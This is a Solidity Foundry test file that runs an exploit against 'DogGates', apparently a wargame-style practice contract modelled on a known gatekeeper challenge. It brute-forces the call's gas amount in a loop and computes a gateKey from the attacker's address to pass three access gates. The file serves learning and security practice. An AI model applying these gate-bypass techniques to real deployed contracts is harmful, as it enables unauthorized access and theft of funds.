// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/hacks/DogGates.sol";

contract DogGatesTest is Test {
    DogGates public dogGates;
    DogGatesBypass public bypassContract;
    address public attacker;

    function setUp() public {
        // Deploy the DogGates contract
        dogGates = new DogGates();

        // Set up the attacker's address
        attacker = address(0xBEEF);

        // Fund the attacker's account with 1 ether to cover transaction costs
        vm.deal(attacker, 1 ether);

        // Deploy the bypass contract with the DogGates contract address
        bypassContract = new DogGatesBypass(address(dogGates));
    }

    function testDogGatesBypass() public {
        // Calculate the correct gateKey based on the attacker's address
        bytes8 gateKey = calculateGateKey(attacker);

        // Start impersonating the attacker
        vm.startPrank(attacker);

        // Print the initial gas left
        emit log_named_uint("Initial gas", gasleft());

        // Try calling the bypass contract with adjusted gas
        uint256 gasAmount = 50000; // Initial gas value
        bool success = false;

        while (!success) {
            try bypassContract.bypass{gas: gasAmount}(gateKey) {
                success = true; // Transaction succeeded
                emit log_named_uint("Successful gas amount", gasAmount);
            } catch {
                emit log_named_uint("Failed attempt with gas", gasAmount);
                gasAmount += 1; // Increase the gas and retry
            }
        }

        // Stop impersonating
        vm.stopPrank();

        // Validate that the attacker is now the entrant in the DogGates contract
        assertEq(dogGates.entrant(), attacker, "Entrant should be the attacker's address after passing all gates");

        //emit log_address("Attacker address set as entrant", attacker);
    }

    // Helper function to calculate the gateKey based on the attacker's address
    function calculateGateKey(address _attacker) internal pure returns (bytes8) {
        uint16 attackerLower16Bits = uint16(uint160(_attacker)); // Get the lower 16 bits of the attacker's address
        bytes8 gateKey = bytes8(uint64(attackerLower16Bits));     // Cast the lower 16 bits to 64 bits (bytes8)
        
        // Ensure the conditions of gateThree:
        // 1. uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
        // 2. uint32(uint64(_gateKey)) != uint64(_gateKey)
        // 3. uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
        // The first part is already satisfied because we only set the lower 16 bits.
        // We now need to add some upper bits to make sure gateThree part two is satisfied.
        return gateKey | (bytes8(uint64(1)) << 32); // Add some upper bits to satisfy the second condition.
    }
}
